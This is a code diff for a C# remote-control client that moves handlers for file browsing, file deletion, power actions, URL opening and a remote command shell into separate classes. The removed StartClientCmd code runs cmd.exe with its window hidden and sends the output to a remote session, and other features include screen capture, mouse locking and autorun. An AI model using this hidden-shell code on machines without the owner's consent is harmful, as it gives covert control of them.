@@ -19,6 +19,7 @@ using System.Net;
 using RemoteControl.Protocals.Response;
 using Microsoft.Win32;
 using System.Runtime.InteropServices;
+using RemoteControl.Client.Handlers;
 using RemoteControl.Protocals.Codec;
 
 namespace RemoteControl.Client
@@ -32,7 +33,6 @@ namespace RemoteControl.Client
         private static Dictionary<string, RequestStartGetScreen> sessionScreenHandleSwitch = new Dictionary<string, RequestStartGetScreen>();
         private static Dictionary<string, bool> sessionVideoHandleSwitch = new Dictionary<string, bool>();
         private static Dictionary<string, bool> sessionDownloadHandleSwitch = new Dictionary<string, bool>();
-        private static Dictionary<string, Process> sessionCmdHandleSwitch = new Dictionary<string, Process>();
         private static Dictionary<string, RequestLockMouse> sessionLockMouseHandleSwitch = new Dictionary<string, RequestLockMouse>();
         private static readonly string LastVideoCapturePathStoreFile = Environment.GetEnvironmentVariable("temp") + "\\vcpsf.dat";
         private static Dictionary<string, FileStream> fileUploadDic = new Dictionary<string, FileStream>();
@@ -47,8 +47,6 @@ namespace RemoteControl.Client
 
         static void Main(string[] args)
         {
-            // 窗体隐藏时调用Console.Title会报错
-            //Console.Title = "RC";
             if (args.Length == 1 && args[0].StartsWith("/delay:"))
             {
                 string str = args[0].Substring("/delay:".Length);
@@ -104,6 +102,18 @@ namespace RemoteControl.Client
             handlers.Add(ePacketType.PACKET_GET_PROCESSES_REQUEST, getProcessesHandler);
             handlers.Add(ePacketType.PACKET_KILL_PROCESS_REQUEST, getProcessesHandler);
             handlers.Add(ePacketType.PACKET_AUTORUN_REQUEST, new RequestAutoRunHandler());
+            handlers.Add(ePacketType.PACKET_GET_DRIVES_REQUEST, new RequestGetDrivesHandler());
+            handlers.Add(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, new RequestGetSubFilesOrDirsHandler());
+            handlers.Add(ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST, new RequestCreateFileOrDirHandler());
+            handlers.Add(ePacketType.PACKET_DELETE_FILE_OR_DIR_REQUEST, new RequestDeleteFileOrDirHandler());
+            RequestPowerHandler powerHandler = new RequestPowerHandler();
+            handlers.Add(ePacketType.PACKET_SHUTDOWN_REQUEST, powerHandler);
+            handlers.Add(ePacketType.PACKET_REBOOT_REQUEST, powerHandler);
+            handlers.Add(ePacketType.PACKET_SLEEP_REQUEST, powerHandler);
+            handlers.Add(ePacketType.PACKET_HIBERNATE_REQUEST, powerHandler);
+            handlers.Add(ePacketType.PACKET_LOCK_REQUEST, powerHandler);
+            handlers.Add(ePacketType.PACKET_OPEN_URL_REQUEST, new RequestOpenUrlHandler());
+            handlers.Add(ePacketType.PACKET_COMMAND_REQUEST, new RequestCommandHandler());
         }
 
         static void ReadParameters()
@@ -205,54 +215,7 @@ namespace RemoteControl.Client
             Console.WriteLine(packetType.ToString());
 
             string sessionId = session.SocketId;
-            if(packetType == ePacketType.PACKET_GET_DRIVES_REQUEST)
-            {
-                ResponseGetDrives resp = new ResponseGetDrives();
-                resp.drives = Environment.GetLogicalDrives().ToList();
-                session.Send(ePacketType.PACKET_GET_DRIVES_RESPONSE, resp);
-            }
-            else if (packetType == ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST)
-            {
-                try
-                {
-                    RequestGetSubFilesOrDirs req = obj as RequestGetSubFilesOrDirs;
-                    ResponseGetSubFilesOrDirs resp = new ResponseGetSubFilesOrDirs();
-                    resp.dirs = new List<Protocals.DirectoryProperty>();
-                    var dirs = System.IO.Directory.GetDirectories(req.parentDir).ToList();
-                    foreach (var item in dirs)
-                    {
-                        DirectoryInfo di = new DirectoryInfo(item);
-                        resp.dirs.Add(new DirectoryProperty()
-                        {
-                            DirPath = item,
-                            CreationTime = di.CreationTime,
-                            LastWriteTime = di.LastWriteTime,
-                            LastAccessTime = di.LastAccessTime
-                        });
-                    }
-
-                    resp.files = new List<FileProperty>();
-                    var files = System.IO.Directory.GetFiles(req.parentDir).ToList();
-                    foreach (var item in files)
-                    {
-                        FileInfo fi = new FileInfo(item);
-                        resp.files.Add(new FileProperty() 
-                        {
-                            FilePath = item,
-                            Size = fi.Length,
-                            CreationTime = fi.CreationTime,
-                            LastWriteTime = fi.LastWriteTime,
-                            LastAccessTime = fi.LastAccessTime
-                        });
-                    }
-                    session.Send(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_RESPONSE, resp);
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine(ex.Message);
-                }
-            }
-            else if (packetType == ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST)
+            if (packetType == ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST)
             {
                 RequestStartGetScreen req = obj as RequestStartGetScreen;
                 if (!sessionScreenHandleSwitch.ContainsKey(sessionId))
@@ -271,60 +234,6 @@ namespace RemoteControl.Client
                 {
                     sessionScreenHandleSwitch.Remove(sessionId);
                 }
-            }
-            else if (packetType == ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST)
-            {
-                RequestCreateFileOrDir req = obj as RequestCreateFileOrDir;
-                ResponseCreateFileOrDir resp = new ResponseCreateFileOrDir();
-                resp.Path = req.Path;
-                resp.PathType = req.PathType;
-                try
-                {
-                    if (req.PathType == ePathType.File)
-                    {
-                        if (!System.IO.File.Exists(req.Path))
-                        {
-                            System.IO.File.Create(req.Path).Close();
-                        }
-                    }
-                    else
-                    {
-                        if (!System.IO.Directory.Exists(req.Path))
-                        {
-                            System.IO.Directory.CreateDirectory(req.Path);
-                        }
-                    }
-                }
-                catch (Exception ex)
-                {
-                    resp.Result = false;
-                    resp.Message = ex.ToString();
-                }
-                session.Send(ePacketType.PACKET_CREATE_FILE_OR_DIR_RESPONSE, resp);
-            }
-            else if (packetType == ePacketType.PACKET_DELETE_FILE_OR_DIR_REQUEST)
-            {
-                RequestDeleteFileOrDir req = obj as RequestDeleteFileOrDir;
-                ResponseDeleteFileOrDir resp = new ResponseDeleteFileOrDir();
-                resp.Path = req.Path;
-                resp.PathType = req.PathType;
-                try
-                {
-                    if (req.PathType == ePathType.File)
-                    {
-                        System.IO.File.Delete(req.Path);
-                    }
-                    else
-                    {
-                        System.IO.Directory.Delete(req.Path);
-                    }
-                }
-                catch (Exception ex)
-                {
-                    resp.Result = false;
-                    resp.Message = ex.ToString();
-                }
-                session.Send(ePacketType.PACKET_DELETE_FILE_OR_DIR_RESPONSE, resp);
             }
             else if (packetType == ePacketType.PACKET_START_DOWNLOAD_REQUEST)
             {
@@ -348,36 +257,6 @@ namespace RemoteControl.Client
                 {
                     sessionDownloadHandleSwitch.Remove(session.SocketId);
                 }
-            }
-            else if (packetType == ePacketType.PACKET_COMMAND_REQUEST)
-            {
-                var req = obj as RequestCommand;
-                StartClientCmd(session, req);
-            }
-            else if (packetType == ePacketType.PACKET_SHUTDOWN_REQUEST)
-            {
-                ProcessUtil.Run("shutdown.exe", "-s -t 0", true);
-            }
-            else if (packetType == ePacketType.PACKET_REBOOT_REQUEST)
-            {
-                ProcessUtil.Run("shutdown.exe", "-r -t 0", true);
-            }
-            else if (packetType == ePacketType.PACKET_SLEEP_REQUEST)
-            {
-                ProcessUtil.Run("rundll32.exe", "powrprof.dll,SetSuspendState 0,1,0", true);
-            }
-            else if (packetType == ePacketType.PACKET_HIBERNATE_REQUEST)
-            {
-                ProcessUtil.Run("rundll32.exe", "powrProf.dll,SetSuspendState", true);
-            }
-            else if (packetType == ePacketType.PACKET_LOCK_REQUEST)
-            {
-                ProcessUtil.Run("rundll32.exe", "user32.dll,LockWorkStation", true);
-            }
-            else if (packetType == ePacketType.PACKET_OPEN_URL_REQUEST)
-            {
-                var req = obj as RequestOpenUrl;
-                ProcessUtil.Run(req.Url, "", false, true);
             }
             else if (packetType == ePacketType.PACKET_MESSAGEBOX_REQUEST)
             {
@@ -833,15 +712,6 @@ namespace RemoteControl.Client
             return -1;
         }
 
-        static void PlayMusic(string path)
-        {
-            //var aa  = Win32API.PlaySound(path, UIntPtr.Zero,
-            //   (uint)(Win32API.SoundFlags.SND_FILENAME | Win32API.SoundFlags.SND_ASYNC | Win32API.SoundFlags.SND_NOSTOP));
-
-            int ret1 = Win32API.mciSendString("open \"" + path + "\" alias mymusic", "", 0, IntPtr.Zero);
-            int ret2 = Win32API.mciSendString("play mymusic", "", 0, IntPtr.Zero);
-        }
-
         static void StopMusic()
         {
             if (lastPlayMusicExeFile != null)
@@ -1016,51 +886,6 @@ namespace RemoteControl.Client
                     session.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE, resp);
                     Thread.Sleep(sleepValue);
                 }
-            }
-        }
-
-        static void StartClientCmd(SocketSession session, RequestCommand req)
-        {
-            if(!sessionCmdHandleSwitch.ContainsKey(session.SocketId))
-                sessionCmdHandleSwitch.Add(session.SocketId,null);
-            if (sessionCmdHandleSwitch[session.SocketId] == null)
-            {
-                Process p = new Process();
-                p.StartInfo.FileName = "cmd.exe";
-                p.StartInfo.CreateNoWindow = true;
-                p.StartInfo.UseShellExecute = false;
-                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                p.StartInfo.RedirectStandardError = true;
-                p.StartInfo.RedirectStandardInput = true;
-                p.StartInfo.RedirectStandardOutput = true;
-                p.OutputDataReceived += (o, args) =>
-                {
-                    ResponseCommand resp = new ResponseCommand();
-                    resp.CommandResponse = args.Data;
-
-                    session.Send(ePacketType.PACKET_COMMAND_RESPONSE, resp);
-
-                    Console.WriteLine(session.SocketId + ":" + args.Data);
-                };
-                p.ErrorDataReceived += (o, args) =>
-                {
-                    ResponseCommand resp = new ResponseCommand();
-                    resp.CommandResponse = args.Data;
-
-                    session.Send(ePacketType.PACKET_COMMAND_RESPONSE, resp);
-                };
-                p.Start();
-
-                p.BeginOutputReadLine();
-                p.BeginErrorReadLine();
-
-                sessionCmdHandleSwitch[session.SocketId] = p;
-            }
-
-            sessionCmdHandleSwitch[session.SocketId].StandardInput.WriteLine(req.Command);
-            if (req.Command.Trim().ToLower() == "exit")
-            {
-                sessionCmdHandleSwitch[session.SocketId] = null;
             }
         }
 
